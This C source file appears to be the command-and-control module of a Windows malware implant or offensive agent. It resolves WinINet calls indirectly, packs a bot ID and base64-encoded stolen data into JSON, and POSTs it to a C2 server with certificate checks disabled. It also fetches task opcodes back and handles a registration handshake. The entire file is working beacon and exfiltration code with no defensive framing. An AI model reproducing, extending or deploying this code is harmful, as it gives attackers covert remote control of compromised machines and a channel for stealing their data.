#include "main.h"

void CloseInternetHandle(HINTERNET hSession, HINTERNET hConnect, HINTERNET hRequest){
	if (hRequest){
		API(WININET, InternetCloseHandle)(hRequest);
	}
	if (hConnect){
		API(WININET, InternetCloseHandle)(hConnect);
	}
	if (hSession){
		API(WININET, InternetCloseHandle)(hSession);
	}
}

LPCSTR* BuildCheckinData(LPCSTR Data, DWORD Mode, size_t DataSize){
	/* BuildCheckinData
	for C2 in json format for callback to c2*/
	//DWORD dwEstSize = 0;
	const char* lpBuffer;
	char* encoded_data = NULL;

	//dwEstSize = mystrlen(Data)+100;
	if(Mode == MODE_CHECKIN_DATA){
		/*size_t b64_len_out = (size_t)(dwEstSize*2);
		encoded_data = (char*)hAlloc(b64_len_out * 2);
		if (encoded_data == NULL){
			//hAlloc failed
			return NULL;
		}*/
		size_t b64_len_out;
		encoded_data = base64_encode(Data, DataSize, &b64_len_out);
		if (encoded_data == NULL) {
			return NULL;
		}

		encoded_data[b64_len_out] = '\0';
		lpBuffer = hAlloc(b64_len_out+50);
		if (lpBuffer == NULL){
			return NULL;
		}
		memoryset(lpBuffer, 0, b64_len_out+50);
	}
	else{
		lpBuffer = hAlloc(50); //for mode_check_in_no_data to fetch the task from server
	}
	switch(Mode){
		case MODE_CHECKIN_NO_DATA:
			mysprintf(lpBuffer, "{\"id\":\"%u\"}", botIdbuf);
			break;
		case MODE_CHECKIN_DATA:
			mysprintf(lpBuffer, "{\"id\":\"%u\",\"data\":\"%s\"}", botIdbuf, encoded_data);
			hFree(encoded_data);
			break;
		default:
			break;
	}
	return lpBuffer;
}



char* BeaconCallbackC2(LPCWSTR CallbackAddress, BOOL isSSL, LPCWSTR targetPath,DWORD SendOpCode, LPCSTR SendBuffer, size_t SendBufferSize){
	/* callback to the c2 and check for a task or deliver data*/
	BOOL bResults = FALSE;
	DWORD flags;
	LPCSTR* ResBuffer = NULL, *UriBuffer = NULL;
	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

	hSession = API(WININET, InternetOpenW)(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0); //INTERNET_OPEN_TYPE_DIRECT
	if (!hSession){
		return FALSE;
	}
	hConnect = API(WININET, InternetConnectW)(hSession, CallbackAddress, 443, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
	
	if (!hConnect){
		API(WININET, InternetCloseHandle)(hSession);
		return FALSE;
	}
	hRequest = API(WININET, HttpOpenRequestW)(hConnect, L"POST", targetPath, NULL,NULL,NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_KEEP_CONNECTION, 0);
	
	if (!hRequest){
		API(WININET, InternetCloseHandle)(hConnect);
		API(WININET, InternetCloseHandle)(hSession);
		return FALSE;
	}
	flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_WRONG_USAGE;

	if(!API(WININET,InternetSetOptionW)(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &flags, sizeof(flags))){
		CloseInternetHandle(hSession, hConnect, hRequest);
		return FALSE;
	}

	if (SendOpCode){
		UriBuffer = BuildCheckinData(SendBuffer, MODE_CHECKIN_DATA, SendBufferSize); //sending data to server
	}
	else{
		UriBuffer = BuildCheckinData(NULL, MODE_CHECKIN_NO_DATA, NULL); //fetching opcodes
	}
	bResults = API(WININET, HttpSendRequestW)(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)UriBuffer, mystrlen(UriBuffer));

	if (UriBuffer) hFree(UriBuffer);

	if (bResults){
		DWORD dwSize = 0;
		DWORD dwDownloaded = 0;
		LPSTR pszOutBuffer; 
		ResBuffer = hAlloc(2*1024*1024);
		char* cp = ResBuffer;

		do{
			//check how much data is available there
			dwSize = 0;
			if(!API(WININET,InternetQueryDataAvailable)(hRequest, &dwSize, 0, 0)){
				break;
			}
			//out of data
			if (!dwSize){
				break;
			}
			//allocate space for the buffer
			pszOutBuffer = hAlloc(dwSize+1);
			if(!pszOutBuffer){
				// out of memory
				break;
			}
			if(!API(WININET, InternetReadFile)(hRequest, (LPVOID) pszOutBuffer, dwSize, &dwDownloaded)){

				CloseInternetHandle(hSession, hConnect, hRequest);
				hFree(ResBuffer);
				return FALSE;
			}
			else{
				mysprintf(cp, "%s",pszOutBuffer);
				cp += mystrlen(pszOutBuffer);
			}
			hFree(pszOutBuffer);

		} while(dwSize > 0);

	}

	if (SendOpCode == DO_CALLBACK){
		if (ResBuffer){
			hFree(ResBuffer);
		}
		CloseInternetHandle(hSession, hConnect, hRequest);
		return TRUE;
	}
	else if (SendOpCode == DO_REGISTER) {
		CloseInternetHandle(hSession, hConnect, hRequest);
		if (!ResBuffer){
			return FALSE;
		}
		if (mystrstr(ResBuffer, "REGOK") == ResBuffer){
			hFree(ResBuffer);
			return TRUE;
		}
		hFree(ResBuffer);
		return FALSE;
	}

	CloseInternetHandle(hSession, hConnect, hRequest);
	if (ResBuffer){
		return ResBuffer;
	}
	return FALSE;
}
